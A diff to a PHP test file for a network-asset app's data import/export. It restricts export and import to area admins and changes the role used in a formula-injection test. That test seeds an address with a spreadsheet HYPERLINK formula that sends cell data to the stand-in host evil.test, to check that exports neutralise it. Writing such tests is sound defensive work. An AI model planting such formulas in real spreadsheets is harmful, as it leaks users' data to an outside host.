@@ -202,17 +202,20 @@ class DataTransferTest extends TestCase
         $this->assertSame(1, $result['created']['cable']); // the drop cable has no code to match on
     }
 
-    public function test_only_admins_import_and_viewers_cannot_export()
+    public function test_only_admins_can_export_and_import()
     {
-        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]))
-            ->post('/data/import', ['file' => $this->fileFrom('<kml/>', 'a.kml')])
-            ->assertForbidden();
-        $this->get('/data/export/kml')->assertOk();
+        foreach ([Role::Teknisi, Role::Viewer] as $role) {
+            $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => $role]));
+            $this->get('/data')->assertForbidden();
+            $this->get('/data/export/kml')->assertForbidden();
+            $this->get('/data/export/xlsx')->assertForbidden();
+            $this->get('/data/template')->assertForbidden();
+            $this->post('/data/import', ['file' => $this->fileFrom('<kml/>', 'a.kml')])->assertForbidden();
+        }
 
-        // The export carries customer data on the port sheet.
-        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Viewer]));
-        $this->get('/data/export/kml')->assertForbidden();
-        $this->get('/data/export/xlsx')->assertForbidden();
+        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::AdminArea]));
+        $this->get('/data')->assertOk();
+        $this->get('/data/export/kml')->assertOk();
         $this->get('/data/template')->assertOk();
     }
 
@@ -276,7 +279,7 @@ class DataTransferTest extends TestCase
     public function test_exported_text_never_becomes_an_excel_formula()
     {
         Odc::factory()->for($this->area)->create(['code' => 'ODC-F', 'address' => '=HYPERLINK("http://evil.test/?d="&A2,"Klik")']);
-        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]));
+        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::AdminArea]));
 
         $file = tempnam(sys_get_temp_dir(), 'xlsx');
         file_put_contents($file, $this->get('/data/export/xlsx')->assertOk()->streamedContent());
